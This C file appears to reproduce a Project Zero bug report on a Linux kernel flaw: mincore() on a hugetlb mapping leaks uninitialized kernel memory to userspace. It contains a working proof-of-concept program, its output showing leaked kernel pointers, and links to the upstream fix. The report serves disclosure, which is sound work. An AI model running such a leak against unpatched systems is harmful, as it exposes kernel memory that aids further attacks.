/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1431

I found the following bug with an AFL-based fuzzer:

When __walk_page_range() is used on a VM_HUGETLB VMA, callbacks from the mm_walk structure are only invoked for present pages. However, do_mincore() assumes that it will always get callbacks for all pages in the range passed to walk_page_range(), and when this assumption is violated, sys_mincore() copies uninitialized memory from the page allocator to userspace.

This bug can be reproduced with the following testcase:

$ cat mincore_test.c
*/

#define _GNU_SOURCE
#include <unistd.h>
#include <sys/mman.h>
#include <err.h>
#include <stdio.h>

unsigned char mcbuf[0x1000];

int main(void) {
  if (mmap((void*)0x66000000, 0x20000000000, PROT_NONE, MAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | MAP_NORESERVE, -1, 0) == MAP_FAILED)
    err(1, "mmap");

  for (int i=0; i<10000; i++) {
    if (mincore((void*)0x86000000, 0x1000000, mcbuf))
      perror("mincore");
    write(1, mcbuf, 0x1000);
  }
}

/*
$ gcc -o mincore_test mincore_test.c -Wall
$ ./mincore_test | hexdump -C | head
00000000  00 00 00 00 00 00 00 00  00 00 00 00 fe 01 00 00  |................|
00000010  80 49 3d 20 c6 e9 ff ff  c0 49 3d 20 c6 e9 ff ff  |.I= .....I= ....|
00000020  00 08 3c 20 c6 e9 ff ff  40 08 3c 20 c6 e9 ff ff  |..< ....@.< ....|
00000030  80 08 3c 20 c6 e9 ff ff  c0 08 3c 20 c6 e9 ff ff  |..< ......< ....|
00000040  00 09 3c 20 c6 e9 ff ff  40 09 3c 20 c6 e9 ff ff  |..< ....@.< ....|
00000050  80 09 3c 20 c6 e9 ff ff  c0 09 3c 20 c6 e9 ff ff  |..< ......< ....|
00000060  00 06 3c 20 c6 e9 ff ff  40 06 3c 20 c6 e9 ff ff  |..< ....@.< ....|
00000070  80 06 3c 20 c6 e9 ff ff  c0 06 3c 20 c6 e9 ff ff  |..< ......< ....|
00000080  00 07 3c 20 c6 e9 ff ff  40 07 3c 20 c6 e9 ff ff  |..< ....@.< ....|
00000090  80 07 3c 20 c6 e9 ff ff  80 78 84 0b c6 e9 ff ff  |..< .....x......|

fixed at https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=373c4557d2aa362702c4c2d41288fb1e54990b7c

The fix has landed in the following upstream stable releases:
https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.14.2
https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.13.16
https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.9.65
https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.4.101

*/